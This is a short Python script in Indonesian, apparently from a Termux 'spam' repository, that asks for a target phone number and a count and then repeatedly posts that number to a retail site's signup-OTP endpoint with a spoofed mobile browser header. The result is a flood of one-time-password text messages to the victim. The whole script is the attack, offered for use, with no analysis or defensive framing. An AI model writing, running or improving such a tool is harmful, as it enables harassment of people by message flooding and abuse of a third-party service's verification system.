#!/usr/bin/env python
import os
import sys
import time
import requests
from requests import post
import subprocess

def bersih():
    os.system("clear")

def lagi():
    f = input("coba lagi? (y/t):")
    if f == "y":
       subprocess.call("python spam.py",shell=True)
    elif f == "t":
         print ("exit")
         sys.exit()  
bersih()
banner = """
<=============================================================================>	                     
 oooooooooo    oo    ooooooo   ooooooooooo oooooooooo    ooooooo   ooooo  oooo 
  888    888 o888  o888  o888o 88  888  88  888    888 o888  o888o   888  88   
  888oooo88   888  888  8  888     888      888oooo88  888  8  888     888     
  888  88o    888  888o8  o888     888      888    888 888o8  o888     888     
 o888o  88o8 o888o   88ooo88      o888o    o888ooo888    88ooo88      o888o  
<=============================================================================>
                      Tools Spam Sms 
    	     https://github.com/r10t-b0y/spambytermux
                https://wa.me/6285706429182
            Tools ini hanya bisa di pakai 1 kali njir
"""
print (banner)
os.system("sleep 5")
no = raw_input("Masukkan Nomer Target (contoh 08575*******) := ")
os.system("sleep 3")
jl = int(input("Masukkan Jumlah :="))
head = {
"connection": "keep-alive",
"User-Agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"
}
dat = {
"phone": no,
}
for i in range(jl):
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp",data=dat,headers=head)
    print ("status:", r.json())
lagi()
os.system("login")
